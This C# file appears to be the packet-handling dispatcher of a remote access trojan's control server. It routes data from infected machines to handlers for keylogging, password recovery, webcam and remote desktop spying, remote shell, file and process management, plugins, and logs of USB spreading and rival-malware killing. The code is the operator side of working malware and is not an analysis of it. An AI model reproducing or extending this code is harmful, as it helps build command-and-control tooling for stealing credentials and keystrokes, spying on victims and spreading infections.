using Server.Connection;
using Server.MessagePack;
using System;
using System.Diagnostics;
using System.Drawing;
using Server.Forms;
using System.Security.Cryptography;
using System.IO;
using System.Windows.Forms;
using Server.Algorithm;

namespace Server.Handle_Packet
{
    public static class Packet
    {
        public static void Read(object Obj)
        {
            Clients client = null;
            try
            {
                object[] array = Obj as object[];
                byte[] data = (byte[])array[0];
                client = (Clients)array[1];
                MsgPack unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes(data);
                if (Program.form1.InvokeRequired)
                {
                    Program.form1.BeginInvoke((MethodInvoker)(() =>
                    {
                        try
                        {
                            switch (unpack_msgpack.ForcePathObject("Packet").AsString)
                            {
                                case "ClientInfo":
                                    {
                                        new HandleListView().AddToListview(client, unpack_msgpack);
                                        break;
                                    }

                                case "Ping":
                                    {
                                        new HandlePing(client, unpack_msgpack);
                                        break;
                                    }

                                case "Logs":
                                    {
                                        new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} {unpack_msgpack.ForcePathObject("Message").AsString}", Color.Black);
                                        break;
                                    }

                                case "thumbnails":
                                    {
                                        new HandleThumbnails(client, unpack_msgpack);
                                        break;
                                    }

                                case "BotKiller":
                                    {
                                        new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} malwares and killed them successfully", Color.Orange);
                                        break;
                                    }

                                case "usb":
                                    {
                                        new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} found {unpack_msgpack.ForcePathObject("Count").AsString} USB drivers and spreaded them successfully", Color.Purple);
                                        break;
                                    }

                                case "recoveryPassword":
                                    {
                                        new HandleRecovery(client, unpack_msgpack);
                                        break;
                                    }

                                case "Received":
                                    {
                                        new HandleListView().Received(client);
                                        break;
                                    }

                                case "Error":
                                    {
                                        new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} error: {unpack_msgpack.ForcePathObject("Error").AsString}", Color.Red);
                                        break;
                                    }
                                case "remoteDesktop":
                                    {
                                        new HandleRemoteDesktop(client, unpack_msgpack);
                                        break;
                                    }

                                case "processManager":
                                    {
                                        new HandleProcessManager().GetProcess(client, unpack_msgpack);
                                        break;
                                    }


                                case "socketDownload":
                                    {
                                        new HandleFileManager().SocketDownload(client, unpack_msgpack);
                                        break;
                                    }

                                case "keyLogger":
                                    {
                                        new HandleKeylogger(client, unpack_msgpack);
                                        break;
                                    }

                                case "fileManager":
                                    {
                                        new HandleFileManager().FileManager(client, unpack_msgpack);
                                        break;
                                    }

                                case "shell":
                                    {
                                        new HandleShell(unpack_msgpack, client);
                                        break;
                                    }

                                case "chat":
                                    {
                                        new HandleChat(unpack_msgpack, client);
                                        break;
                                    }

                                case "reportWindow":
                                    {
                                        new HandleReportWindow(client, unpack_msgpack.ForcePathObject("Report").AsString);
                                        break;
                                    }

                                case "webcam":
                                    {
                                        new HandleWebcam(unpack_msgpack, client);
                                        break;
                                    }

                                case "plugin":
                                    {
                                        new HandlePlugin(client, unpack_msgpack.ForcePathObject("Hash").AsString);
                                        break;
                                    }
                            }

                        }
                        catch
                        {
                            new HandleLogs().Addmsg($"Client {client.TcpClient.RemoteEndPoint.ToString().Split(':')[0]} tried to connect with wrong packet", Color.Red);
                            //  Settings.Blocked.Add(client.ClientSocket.RemoteEndPoint.ToString().Split(':')[0]); // todo - create a mehtod to block spammers??
                            client.Disconnected();
                            return;
                        }
                    }));
                }
            }
            catch
            {
                client.Disconnected();
                return;
            }
        }
    }
}